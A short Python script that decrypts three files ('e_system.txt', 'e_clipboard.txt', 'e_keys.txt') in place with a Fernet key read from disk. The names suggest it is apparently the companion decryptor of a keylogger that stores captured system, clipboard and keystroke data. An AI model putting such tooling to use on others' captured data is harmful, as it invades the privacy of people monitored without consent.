from cryptography.fernet import Fernet

# Load encryption key
with open('encryption_key.txt', 'rb') as file:
    key = file.read()

fernet = Fernet(key)

# Encrypted files
encrypted_files = ["e_system.txt", "e_clipboard.txt", "e_keys.txt"]

for encrypted_file in encrypted_files:
    with open(encrypted_file, "rb") as file:
        data = file.read()

    decrypted = fernet.decrypt(data)

    with open(encrypted_file, "wb") as file:
        file.write(decrypted)